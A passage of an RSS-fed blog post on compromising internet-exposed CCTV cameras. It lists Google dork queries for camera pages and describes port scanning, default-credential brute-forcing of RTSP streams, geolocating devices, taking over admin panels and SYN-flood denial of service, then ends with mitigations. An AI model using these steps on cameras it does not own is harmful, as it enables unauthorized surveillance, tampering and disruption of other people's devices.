&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MOBOTIX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PDAS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MOBOTX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Seiten&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pda&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;camera&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Edr1680 remote viewer&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;NetCam Live Image&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;edu&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gov&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;johnny&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ihackstuff&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;INTELLINET&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;IP Camera Homepage&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WEBDVR&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;product&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;demo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Middle frame of Videoconference Management System&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htm&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tilt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Live View / - AXIS&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;AXIS 240 Camera Server&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;server push&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--- VIDEO WEB SERVER ---&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Video Web Server&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Any time &amp;amp; Any where&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HomeSeer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Web&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Control&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Home&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Events&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;camctrl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cgi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;supervisioncam protocol&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;active webcame page&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking.png&#34;
	width=&#34;1920&#34;
	height=&#34;1000&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_hu7955939607532502183.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_hu930169016370301703.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Google Dorking&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;192&#34;
		data-flex-basis=&#34;460px&#34;
	
&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_cctv.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_cctv_hu1090711425912968332.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_cctv_hu4876511850212848111.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;CCTV&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;
We won&amp;rsquo;t cover much of the dorking part, because it is painful to extract the links from a google search queries and the other 2 mentioned methods work well for our purporse.&lt;/p&gt;
&lt;h4 id=&#34;port-scanning&#34;&gt;Port Scanning
&lt;/h4&gt;&lt;p&gt;Instead of using Shodan for getting Devices with a open port, we can manually scan for open ports. This is the method that should be opted for collecting IP Addresses of CCTVs on a Local/Corporate Network. We can use Port Scanning tools like &lt;a class=&#34;link&#34; href=&#34;https://nmap.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;nmap&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/tools/unicornscan/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;unicornscan&lt;/a&gt;, etc. For scanning a Large Subdomain/Large Number of Devices I&amp;rsquo;d prefer using &lt;em&gt;unicornscan&lt;/em&gt; tool, because it sends all the &lt;em&gt;SYN Packets&lt;/em&gt; without waiting for responses and starts a sniffer which looks for &lt;em&gt;SYN-ACK Packets&lt;/em&gt; to determine which Device has an open port, making it faster than &lt;em&gt;nmap&lt;/em&gt;.&lt;br /&gt;
In the following example of port scan, I&amp;rsquo;ve used &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/Port-Scanner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/Port-Scanner&lt;/a&gt;. In this repository &lt;em&gt;port_scanner.py&lt;/em&gt; sends the &lt;em&gt;SYN Packet&lt;/em&gt;, waits for the &lt;em&gt;SYN-ACK Packets&lt;/em&gt; and then completes the TCP Handshake by sending the &lt;em&gt;ACK&lt;/em&gt; Packet and finally closes the connection by sending &lt;em&gt;FIN Packet&lt;/em&gt; making it a slow scanner. The &lt;em&gt;scapy_port_scanner.py&lt;/em&gt; (used in the following example) is somewhat based on the &lt;em&gt;unicornscan tool&lt;/em&gt; and is faster than &lt;em&gt;port_scanner.py&lt;/em&gt;.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/port_scanner.png&#34;
	width=&#34;1018&#34;
	height=&#34;959&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/port_scanner_hu3693660484821326266.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/port_scanner_hu14907436726361292309.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Port Scanner&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;106&#34;
		data-flex-basis=&#34;254px&#34;
	
&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&#34;compiling-a-suitable-wordlist-for-brute-force&#34;&gt;Compiling a suitable Wordlist for Brute-Force
&lt;/h3&gt;&lt;p&gt;We can make a wordlist by looking for Default Credentials for various CCTV Vendors, Weak Credentials and credentials present in &lt;a class=&#34;link&#34; href=&#34;https://github.com/danielmiessler/SecLists&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SecLists&lt;/a&gt;.&lt;br /&gt;
Here, I won’t disclose more information about the wordlists that I use.&lt;/p&gt;
&lt;h2 id=&#34;brute-force&#34;&gt;Brute Force
&lt;/h2&gt;&lt;p&gt;After Collecting the IP Address, Port and Credentials, we&amp;rsquo;re ready to do a Brute-Force attack on the Devices.&lt;br /&gt;
I use &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/RTSP-Brute-Force&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/RTSP-Brute-Force&lt;/a&gt;, it is a Program written in python that uses OpenCV to brute force the CCTVs and uses multithreading module to parallelize the brute force tasks. We can also redirect the Error output by OpenCv by using the error redirected to Null &lt;em&gt;2&amp;gt;/dev/null&lt;/em&gt; at the end of the command.&lt;br /&gt;
Here in the following exampe, I&amp;rsquo;ve run the program and also opened the Stream in &lt;a class=&#34;link&#34; href=&#34;https://www.videolan.org/vlc/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;VLC Media Player&lt;/a&gt; of the CCTV that it gained access to.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_access_gained.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_access_gained_hu7225274532095461435.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_access_gained_hu12319331695325303554.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;CCTV&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
We can further more Geolocate the IP Addresses using &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/IP-Location&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/IP-Location&lt;/a&gt; to get an approximate location of the Devices (although it may not always be correct)&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/ip_location.png&#34;
	width=&#34;1799&#34;
	height=&#34;861&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/ip_location_hu6535110091859157299.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/ip_location_hu13102888798691609469.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;IP Location&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;208&#34;
		data-flex-basis=&#34;501px&#34;
	
&gt;
We can now even open the Admin Panel of the CCTV using the Browser and can manipulate crucial settings, backup storage and more.
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_settings.png&#34;
	width=&#34;1920&#34;
	height=&#34;926&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_settings_hu8200271080662183132.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_settings_hu17345935752817358705.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;CCTV Settings&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;497px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;dos&#34;&gt;DOS
&lt;/h2&gt;&lt;p&gt;We can also do a DOS (Denial-of-Service) attack on the CCTV Device to interrupt the live stream. We can use various tools to do a DOS Attack like &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/SYN-Flood-Attack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/SYN-Flood-Attack&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/tools/goldeneye/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GoldenEye&lt;/a&gt;, etc&lt;br /&gt;
But I prefer using the &lt;em&gt;hping&lt;/em&gt; tool to do SYN Flood Attack because its more effective.
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/gif/cctv_dos.gif&#34;
	width=&#34;1152&#34;
	height=&#34;648&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/gif/cctv_dos_hu15656584701875584317.gif 480w, http://localhost:1313/p/compromising-cctvs-101/assets/gif/cctv_dos_hu3609808415653887726.gif 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;DOS Attack on CCTV&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
&lt;/h2&gt;&lt;p&gt;In this blog we saw that how easy it was to gain access to a CCTV that was misconfigured (exposed to internet, using weak credentials) in several ways.&lt;br /&gt;
To avoid getting your CCTV Device compromised, you should take the following steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make sure that a CCTV Device on your Local Network is not exposed to the Internet&lt;/li&gt;
&lt;li&gt;Not using Default/Weak Credentials&lt;/li&gt;
&lt;li&gt;Setting up Proper Firewall Rules&lt;/li&gt;
&lt;li&gt;Keeping the Software/Firmware up to date, to avoid any CVEs present in the device that could be exploited&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;note&#34;&gt;Note
&lt;/h3&gt;&lt;p&gt;The Above mentioned points doesn&amp;rsquo;t Guarantee 100% protection, they only enhance the security&lt;/p&gt;
&lt;h2 id=&#34;checking-leaked-passwords&#34;&gt;Checking Leaked Passwords
&lt;/h2&gt;&lt;p&gt;There are several websites you can use to check whether the password that you&amp;rsquo;re using has been leaked somewhere online or not. Here are some popular ones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://haveibeenpwned.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Have I Been Pwned&lt;/a&gt;: Check if your email or phone is in a data breach&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.dehashed.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Dehashed&lt;/a&gt;: Free deep-web scans and protection against credential leaks&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakcheck.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;LeakCheck.io&lt;/a&gt;: Make sure your credentials haven&amp;rsquo;t been compromised&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;crackstation.net&lt;/a&gt;: Massive pre-computed lookup tables to crack password hashes&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashkiller.io/listmanager&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;HashKiller&lt;/a&gt;: Pre-cracked Hashes, easily searchable&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakedpassword.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;LeakedPassword&lt;/a&gt;: Search across multiple data breaches to see if your pass has been compromised&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://bugmenot.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;BugMeNot&lt;/a&gt;: Find and share logins&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- --&gt;
&lt;p&gt;Source: &lt;a class=&#34;link&#34; href=&#34;https://github.com/edoardottt/awesome-hacker-search-engines&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;edoardottt/awesome-hacker-search-engines&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
